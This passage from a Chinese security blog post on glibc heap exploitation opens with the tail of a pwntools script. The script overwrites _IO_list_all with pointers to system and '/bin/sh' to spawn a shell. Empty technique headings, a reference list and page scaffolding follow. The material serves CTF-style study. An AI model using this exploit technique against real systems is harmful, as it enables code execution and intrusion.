class="hljs-number">0</span>)*<span class="hljs-number">10</span> + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p8(<span class="hljs-number">0xb1</span>))<br>edit(chunk_C, p64(<span class="hljs-number">0</span>) + p64(libc.sym._IO_list_all - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">2</span>))<br>edit(chunk_E, p64(libc.sym.system) + p64(heap + <span class="hljs-number">0x178</span>))<br><br>malloc()<br><br><span class="hljs-comment">#  =============================================================================</span><br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>



<h3 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h3><h3 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h3><h3 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a>House of Einherjar</h3><h3 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h3><h3 id="Poison-Null-Byte"><a href="#Poison-Null-Byte" class="headerlink" title="Poison Null Byte"></a>Poison Null Byte</h3><h3 id="Tcache-Dup"><a href="#Tcache-Dup" class="headerlink" title="Tcache Dup"></a>Tcache Dup</h3><h2 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://www.udemy.com/">Udemy</a></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.udemy.com/course/linux-heap-exploitation-part-1/">Linux Heap Exploitation - Part 1</a></li>
<li><a target="_blank" rel="noopener" href="https://www.udemy.com/course/linux-heap-exploitation-part-2/">Linux Heap Exploitation - Part 2</a></li>
<li><a target="_blank" rel="noopener" href="https://www.udemy.com/course/linux-heap-exploitation-part-3/">Linux Heap Exploitation - Part 3</a></li>
</ul>
</li>
<li><p>source code</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.gnu.org/software/libc/">glibc code</a></li>
</ul>
</li>
<li><p><a href="www.52pojie.cn">å¾çˆ±ç ´è§£</a></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&uid=1573412&do=thread&view=me&from=space">å‘†æ¯›ç‹ä¸å’–å–±æ£’</a></li>
</ul>
</li>
<li><p>github blog</p>
<ul>
<li> <a target="_blank" rel="noopener" href="https://nightrainy.github.io/2019/05/06/glic%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">çŸ¥ä¸–-glbicå†…å­˜ç®¡ç†å­¦ä¹ ç¬”è®° </a></li>
</ul>
</li>
<li><p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/">çœ‹é›ªè®ºå›</a></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-262424.htm#msg_header_h2_3">Largebin attackæ€»ç»“</a></li>
</ul>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/">CSDN</a></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/category_10328044.html">hollk-å †æº¢å‡º</a></li>
</ul>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/">åšå®¢å›­</a></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/11801400.html">Pwnki-Linuxå †çš„ä¸€äº›åŸºç¡€çŸ¥è¯†</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/15520621.html#malloc_consolidatemstate-av">Pwnki-glibc 2.31 mallocä¸free æºç åˆ†æ</a></li>
</ul>
</li>
<li><p>æ–‡æ¡£</p>
<ul>
<li><a href="attachment%5Creport%5Cglibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf">ååº­å¸ˆå‚… - glibcå†…å­˜ç®¡ç†ptmallocæºä»£ç åˆ†æ</a></li>
</ul>
</li>
</ul>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/pwn/" class="category-chain-item">pwn</a>
  
  
    <span>></span>
    
  <a href="/categories/pwn/heap/" class="category-chain-item">heap</a>
  
  

  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/glibc-source-code/">#glibc source code</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Basic Heap</div>
      <div>https://ferity-fan.github.io/2022/10/20/Heap/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>Ferity-Fan</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2022å¹´10æœˆ20æ—¥</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>æ›´æ–°äº</div>
          <div>2022å¹´10æœˆ20æ—¥</div>
        </div>
      
      <div class="license-meta-item">
        <div>è®¸å¯åè®®</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
              <span class="hint--top hint--rounded" aria-label="NC - éå•†ä¸šæ€§ä½¿ç”¨">
                <i class="iconfont icon-nc"></i>
              </span>
              </a>
            
              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
              <span class="hint--top hint--rounded" aria-label="SA - ç›¸åŒæ–¹å¼å…±äº«">
                <i class="iconfont icon-sa"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <span>Copyright <i class="iconfont icon-copyright"></i> 2022 by <a href="https://ferity-fan.github.io/" target="_blank" rel="nofollow noopener"><span>ferity-fan<span></a></span><br> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
